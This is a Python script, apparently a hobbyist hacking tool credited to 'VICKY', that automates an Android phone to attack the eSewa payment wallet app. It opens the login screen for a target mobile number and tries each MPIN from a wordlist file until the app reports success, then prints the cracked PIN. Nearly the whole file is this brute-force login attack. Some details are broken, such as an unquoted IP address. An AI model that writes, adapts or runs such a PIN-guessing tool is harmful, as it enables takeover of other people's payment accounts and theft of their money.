import uiautomator2 as u2

# Connect to the device
d = u2.connect(192.168.10.169)

# Open the Android settings
d.app_start("com.android.settings")

# Wait for the Settings app to load
d(text="Network & internet").click()  # Replace with "Connections" if needed for your device
d(text="Hotspot & tethering").click()

# Enable Bluetooth tethering
d(text="Bluetooth tethering").click()

# Check if Bluetooth tethering is toggled on, if not, toggle it
if not d(resourceId="android:id/switchWidget").info['checked']:
    d(resourceId="android:id/switchWidget").click()
    print("Bluetooth tethering is enabled.")
else:
    print("Bluetooth tethering is already enabled.")

# You can continue the rest of your automation process after this
d.app_start("com.f1soft.esewa")

# Wait for the app to load
d.wait_activity("com.f1soft.esewa.app.main.MainActivity", timeout=20)

d(resourceId="com.f1soft.esewa:id/toolbar_login/register").click()

print('\n--v1.1.3------**[~~Vcypherr~~] | coded by:VICKY**------v1.1.3--\n')

file = open('mpins.txt', 'r')

MobileNumber = input('Enter Mobile Number: ').strip()
print("Target Mobile Number (+977):", MobileNumber)
print("\nTrying MPINs from the list ...")

i = 0
while True:
    passw = file.readline().strip()
    if not passw:
        break  # Exit the loop if no more MPINs are in the file
    
    if len(passw) < 4:
        continue

    print(str(i + 1) + " : " + passw)
    
    try:
        # Assuming there are fields for entering the mobile number and MPIN
        d(resourceId="com.f1soft.esewa:id/mobileNumberField").set_text(MobileNumber)
        d(resourceId="com.f1soft.esewa:id/mpinField").set_text(passw)

        # Click the login/submit button
        d(resourceId="com.f1soft.esewa:id/loginButton").click()

        # Add a delay to wait for the login response
        d.sleep(2)

        # Check if login was successful, based on some condition (modify as needed)
        if d(resourceId="com.f1soft.esewa:id/loginSuccessMessage").exists:
            print('Your MPIN is:', passw)
            break

    except Exception as e:
        print('Error:', e)

    i += 1

file.close()